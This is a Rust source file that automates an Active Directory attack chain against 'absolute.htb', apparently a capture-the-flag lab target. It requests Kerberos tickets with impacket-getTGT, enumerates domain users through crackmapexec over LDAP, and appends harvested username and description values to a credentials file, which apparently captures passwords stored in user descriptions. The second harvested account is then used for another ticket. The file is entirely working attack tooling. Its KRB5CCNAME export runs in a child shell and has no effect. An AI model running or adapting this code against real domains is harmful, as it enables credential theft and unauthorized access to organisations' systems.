use std::process::Command;
use std::fs::{File, OpenOptions};
use std::io::{Write, BufRead, BufReader, BufWriter};

pub fn run_impacket_gettgt_first_user() {
    let input_path = "creds.txt";
    let file = File::open(input_path).expect("Unable to open file");
    let reader = BufReader::new(file);

    // Read the first line from the creds.txt file
    let first_line = reader.lines().next().expect("Unable to read line");
    let creds = first_line.expect("Unable to parse line");

    // Prepare the impacket-getTGT command with the specified arguments
    let output = Command::new("impacket-getTGT")
        .arg(format!("absolute.htb/{}", creds))
        .output()
        .expect("failed to execute impacket-getTGT");

    // Print the command output to the console
    let output_str = String::from_utf8_lossy(&output.stdout);
    println!("{}", output_str);
    println!("{}", String::from_utf8_lossy(&output.stderr));

    // Look for the line "Saving ticket in" and extract the ccache filename
    if let Some(ccache_line) = output_str.lines().find(|line| line.contains("Saving ticket in")) {
        let ccache_filename: &str = ccache_line.split("in ").nth(1).unwrap_or("").trim();

        // Run "export KRB5CCNAME="
        let export_output = Command::new("bash")
            .arg("-c")
            .arg(format!("export KRB5CCNAME={}", ccache_filename))
            .output()
            .expect("failed to execute export KRB5CCNAME command");

        println!("{}", String::from_utf8_lossy(&export_output.stdout));
        println!("{}", String::from_utf8_lossy(&export_output.stderr));
    }
}

pub fn run_crackmapexec() -> String {
    // Read the first line from the creds.txt file
    let input_path = "creds.txt";
    let file = File::open(input_path).expect("Unable to open file");
    let reader = BufReader::new(file);
    let first_line = reader.lines().next().expect("Unable to read line");
    let creds = first_line.expect("Unable to parse line");

    // Split the creds string by the colon and take the first part (username)
    let username = creds.split(':').next().unwrap_or("");

    // Prepare the crackmapexec command with the specified arguments
    let output = Command::new("crackmapexec")
        .arg("ldap")
        .arg("absolute.htb")
        .arg("-u")
        .arg(username)
        .arg("-d")
        .arg("absolute.htb")
        .arg("-k")
        .arg("--kdcHost")
        .arg("dc.absolute.htb")
        .arg("--users")
        .output()
        .expect("failed to execute crackmapexec");

    // Return the command output as a String
    String::from_utf8_lossy(&output.stdout).to_string()
}

pub fn update_creds_file(crackmapexec_output: &str) {
    // Open creds.txt
    let file = OpenOptions::new()
        .append(true)
        .open("creds.txt")
        .expect("Unable to open file");

    let mut file = BufWriter::new(file);

    for line in crackmapexec_output.lines() {
        if line.starts_with("LDAP absolute.htb") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 6 {
                let username = parts[4];
                let info = parts[5];

                // Check if part[5] is not empty and is a single string
                if !info.is_empty() && !info.contains(' ') {
                    writeln!(&mut file, "{}:{}", username, info)
                        .expect("Unable to write data to file");
                }
            }
        }
    }
}

pub fn run_impacket_gettgt_second_user() {
    let input_path = "creds.txt";
    let file = File::open(input_path).expect("Unable to open file");
    let reader = BufReader::new(file);

    // Read the second line from the creds.txt file
    let second_line = reader.lines().nth(1).expect("Unable to read second line");
    let creds = second_line.expect("Unable to parse second line");

    // Prepare the impacket-getTGT command with the specified arguments
    let output = Command::new("impacket-getTGT")
        .arg(format!("absolute.htb/{}", creds))
        .output()
        .expect("failed to execute impacket-getTGT");

    // Print the command output to the console
    let output_str = String::from_utf8_lossy(&output.stdout);
    println!("{}", output_str);
    println!("{}", String::from_utf8_lossy(&output.stderr));

    // Look for the line "Saving ticket in" and extract the ccache filename
    if let Some(ccache_line) = output_str.lines().find(|line| line.contains("Saving ticket in")) {
        let ccache_filename: &str = ccache_line.split("in ").nth(1).unwrap_or("").trim();

        // Run "export KRB5CCNAME="
        let export_output = Command::new("bash")
            .arg("-c")
            .arg(format!("export KRB5CCNAME={}", ccache_filename))
            .output()
            .expect("failed to execute export KRB5CCNAME command");

        println!("{}", String::from_utf8_lossy(&export_output.stdout));
        println!("{}", String::from_utf8_lossy(&export_output.stderr));
    }
}
